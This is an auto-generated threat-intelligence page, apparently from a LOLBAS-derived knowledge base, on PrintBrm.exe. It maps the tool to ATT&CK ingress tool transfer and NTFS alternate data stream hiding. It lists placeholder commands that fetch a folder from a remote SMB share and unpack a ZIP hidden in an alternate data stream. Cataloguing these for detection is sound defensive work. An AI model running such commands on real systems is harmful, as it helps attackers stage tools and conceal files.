---
parsed_by: focuslocust
source: lolbas
type: generated
---
# PrintBrm.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `printbrm.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/PrintBrm.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Printer Migration Command-Line Tool

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/printbrm.md)
- Source verification: [source record](../../sources/lolbas/printbrm.exe.md)

## Aliases

- `PrintBrm.exe`
- `printbrm.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip} |
| [T1564.004 - NTFS File Attributes](../../attack/techniques/T1564.004-ntfs-file-attributes.md) | explicit | source | Command metadata lists T1564.004: PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/printbrm.exe.md)

## Source Verification

[source record](../../sources/lolbas/printbrm.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@elliotkillick'
Person: Elliot Killick
Author: Elliot Killick
Commands:
- Category: Download
Command: PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
Description: Create a ZIP file from a folder in a remote drive
```
